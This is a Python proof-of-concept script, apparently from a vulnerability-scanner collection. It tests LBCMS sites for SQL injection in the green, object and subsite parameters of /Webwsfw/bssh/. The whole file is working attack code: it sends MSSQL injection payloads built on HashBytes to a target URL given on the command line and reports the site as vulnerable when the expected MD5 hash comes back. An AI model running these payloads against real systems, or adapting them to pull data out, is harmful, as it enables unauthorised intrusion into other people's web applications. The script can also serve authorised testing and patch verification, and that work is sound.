#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: LBCMS多处SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0122653
author: Lucifer
description: 1、/Webwsfw/bssh/?green=1
             2、/Webwsfw/bssh/?object=11
             3、/Webwsfw/bssh/?subsite=1 都存在注入。
'''
import sys
import requests
import warnings
sys.path.append('../../') 
from color import *

class lbcms_webwsfw_bssh_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/Webwsfw/bssh/?green=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
                    "/Webwsfw/bssh/?object=11%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
                    "/Webwsfw/bssh/?subsite=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--"]
        try:
            noexist = True
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    printGreen("[+]Success:存在LBCMS多处SQL注入漏洞...(高危)\tpayload: "+vulnurl)
                    noexist = False
            if noexist:
                printBlue("[-]Info:不存在lbcms_webwsfw_bssh_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = lbcms_webwsfw_bssh_sqli(sys.argv[1])
    testVuln.run()